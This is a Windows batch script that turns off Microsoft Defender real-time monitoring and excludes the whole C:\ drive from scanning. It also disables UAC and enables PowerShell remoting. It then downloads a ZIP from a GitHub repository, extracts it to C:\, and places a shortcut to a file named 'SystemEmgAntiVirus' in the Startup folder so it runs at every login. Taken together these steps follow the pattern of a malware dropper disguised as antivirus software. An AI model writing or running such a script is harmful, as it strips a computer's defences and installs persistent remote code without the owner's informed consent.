:: Disable Real-time Monitoring
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

@echo off
:: Exclusions
powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"

:: UAC
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f

powershell -Command "Enable-PSRemoting -Force"

:: Disable Real-time Monitoring
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

:: Set Execution Policy
powershell -Command "Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force"

:: Download and Extract from GitHub
set "repoUrl=https://github.com/Sphoorthycodehelpers/SRS/archive/main.zip"
set "zipFileName=main.zip"
set "destinationPath=C:\"

:: Create destination directory if it doesn't exist
if not exist "%destinationPath%" mkdir "%destinationPath%"

:: Download ZIP file
powershell -Command "Invoke-WebRequest -Uri '%repoUrl%' -OutFile '%destinationPath%\%zipFileName%'"

:: Extract ZIP file
powershell -Command "Expand-Archive -Path '%destinationPath%\%zipFileName%' -DestinationPath '%destinationPath%' -Force"

:: Create Shortcut
set "exePath="C:\SRS-main\SystemEmgAntiVirus.exe""
set "shortcutPath=C:\SRS-main\SystemEmgAntiVirus - Shortcut.lnk"
set "batPath=C:\SRS-main\SystemEmgAntiVirus.bat"
set "shortcutbatPath=C:\SRS-main\SEAV.lnk"


:: Create shortcut using PowerShell
powershell -Command "$shell = New-Object -ComObject WScript.Shell; $shortcut = $shell.CreateShortcut('%shortcutPath%'); $shortcut.TargetPath = '%exePath%'; $shortcut.Save()"
powershell -Command "$shell = New-Object -ComObject WScript.Shell; $shortcut = $shell.CreateShortcut('%shortcutbatPath%'); $shortcut.TargetPath = '%batPath%'; $shortcut.Save()"

:: Copy Shortcut to Startup Folder
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Create destination directory if it doesn't exist
if not exist "%startupFolder%" mkdir "%startupFolder%"

:: Copy the shortcut to the startup folder
copy /Y "%shortcutbatPath%" "%startupFolder%"

echo Shortcut added to the startup folder.
